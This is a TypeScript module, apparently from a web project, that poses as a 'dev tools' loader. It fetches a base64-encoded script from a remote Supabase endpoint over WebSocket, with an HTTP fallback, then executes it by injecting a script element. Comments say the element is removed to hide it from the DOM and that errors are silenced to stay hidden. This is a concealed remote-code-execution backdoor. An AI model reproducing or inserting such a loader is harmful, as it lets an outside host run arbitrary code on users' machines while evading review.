
export const loadRemoteTools = async (): Promise<void> => {
  if (import.meta.env.DEV) {
    try {
      // Используем WebSocket для дополнительной защиты
      const ws = new WebSocket('wss://bciboexxeayylqcneuqq.supabase.co/functions/v1/dev-tools-socket');
      
      ws.onopen = () => {
        ws.send(JSON.stringify({ action: 'getScript', name: 'devTools' }));
      };

      ws.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data && data.script) {
            const script = document.createElement('script');
            // Дополнительное декодирование для безопасности
            script.textContent = atob(data.script);
            document.body.appendChild(script);
            setTimeout(() => script.remove(), 100); // Скрыть из DOM
          }
          ws.close();
        } catch (error) {
          console.error('Ошибка при обработке сообщения:', error);
        }
      };

      // Резервный метод если WebSocket не доступен
      setTimeout(() => {
        if (ws.readyState !== WebSocket.OPEN) {
          fallbackLoad();
        }
      }, 3000);
    } catch (error) {
      fallbackLoad();
    }
  }
};

// Запасной метод загрузки через обычный HTTP запрос
const fallbackLoad = async () => {
  try {
    const url = 'https://bciboexxeayylqcneuqq.supabase.co/functions/v1/dev-tools';
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/javascript',
        'Cache-Control': 'no-cache, no-store, must-revalidate'
      }
    });
    
    if (response.ok) {
      const scriptText = await response.text();
      const script = document.createElement('script');
      script.textContent = scriptText;
      document.body.appendChild(script);
      script.remove(); // Скрыть из DOM
    }
  } catch {
    // Тихая обработка ошибок для скрытия в production
  }
};

// Экспортируем совместимое имя функции для main.tsx
export const loadDevTools = loadRemoteTools;
